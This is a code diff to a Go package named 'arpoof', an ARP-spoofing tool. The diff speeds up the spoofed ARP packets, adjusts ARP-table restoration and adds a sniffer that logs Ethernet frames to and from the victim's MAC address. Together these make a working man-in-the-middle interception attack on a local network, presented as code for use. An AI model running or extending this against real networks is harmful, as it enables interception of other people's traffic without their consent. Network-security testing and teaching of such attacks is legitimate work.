@@ -3,7 +3,6 @@ package arpoof
 import (
 	"bytes"
 	"log"
-	"net"
 	"os"
 	"os/signal"
 	"time"
@@ -45,9 +44,10 @@ func Spoof(target, gateway hdisc.DevData) {
 		}
 	}()
 
-	go readARP(handle, stop, ifi)
+	// go readARP(handle, stop, ifi)
+	go readARP(handle, stop, target, gateway)
 
-	<-WriteARPPack(handle, *localDev, target, time.Second*2, stop)
+	<-WriteARPPack(handle, *localDev, target, time.Millisecond*500, stop)
 
 	<-RestoreARPTables(handle, target, gateway)
 	// when there is a signal to stop from writing, continue to return
@@ -81,6 +81,7 @@ func WriteARPPack(handle *pcap.Handle, attacker, target hdisc.DevData, timeout t
 					log.Printf("Error writing packet to handle: %s\n", err)
 					continue
 				}
+				log.Printf("Sending ARP packet: (%s:%s) -> (%s:%s)\n", attacker.IP.String(), attacker.Mac.String(), target.IP.String(), target.Mac.String())
 			}
 		}
 	}(stopped)
@@ -98,10 +99,11 @@ func RestoreARPTables(handle *pcap.Handle, src, victim hdisc.DevData) chan struc
 		close(stopCh)
 	}()
 
-	return WriteARPPack(handle, src, victim, time.Millisecond*500, stopCh)
+	return WriteARPPack(handle, src, victim, time.Millisecond*200, stopCh)
 }
 
-func readARP(handle *pcap.Handle, stop chan struct{}, ifi *net.Interface) {
+// func readARP(handle *pcap.Handle, stop chan struct{}, ifi *net.Interface) {
+func readARP(handle *pcap.Handle, stop chan struct{}, target, gateway hdisc.DevData) {
 	ps := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
 	packets := ps.Packets()
 	for {
@@ -109,18 +111,28 @@ func readARP(handle *pcap.Handle, stop chan struct{}, ifi *net.Interface) {
 		case <-stop:
 			return
 		case p := <-packets:
-			arpLayer := p.Layer(layers.LayerTypeARP)
-			if arpLayer == nil {
+			// 	arpLayer := p.Layer(layers.LayerTypeARP)
+			// 	if arpLayer == nil {
+			// 		continue
+			// 	}
+			// 	pack := arpLayer.(*layers.ARP)
+			// 	if !bytes.Equal([]byte(ifi.HardwareAddr), pack.SourceHwAddress) {
+			// 		continue
+			// 	}
+			// 	if pack.Operation == layers.ARPReply {
+			// 		// idk
+			// 	}
+			// 	log.Printf("ARP packet (%d): %v (%v) -> %v (%v)\n", pack.Operation, net.IP(pack.SourceProtAddress), net.HardwareAddr(pack.SourceHwAddress), net.IP(pack.DstProtAddress), net.HardwareAddr(pack.DstHwAddress))
+
+			ethLayer := p.Layer(layers.LayerTypeEthernet)
+			if ethLayer == nil {
 				continue
 			}
-			pack := arpLayer.(*layers.ARP)
-			if !bytes.Equal([]byte(ifi.HardwareAddr), pack.SourceHwAddress) {
-				continue
+			pack := ethLayer.(*layers.Ethernet)
+
+			if bytes.Equal(pack.SrcMAC, target.Mac) || bytes.Equal(pack.DstMAC, target.Mac) {
+				log.Printf("\nCaptured packet: %v -> %v | Length: %d bytes\n", pack.SrcMAC, pack.DstMAC, len(p.Data()))
 			}
-			if pack.Operation == layers.ARPReply {
-				// idk
-			}
-			log.Printf("ARP packet (%d): %v (%v) -> %v (%v)\n", pack.Operation, net.IP(pack.SourceProtAddress), net.HardwareAddr(pack.SourceHwAddress), net.IP(pack.DstProtAddress), net.HardwareAddr(pack.DstHwAddress))
 		}
 	}
 }
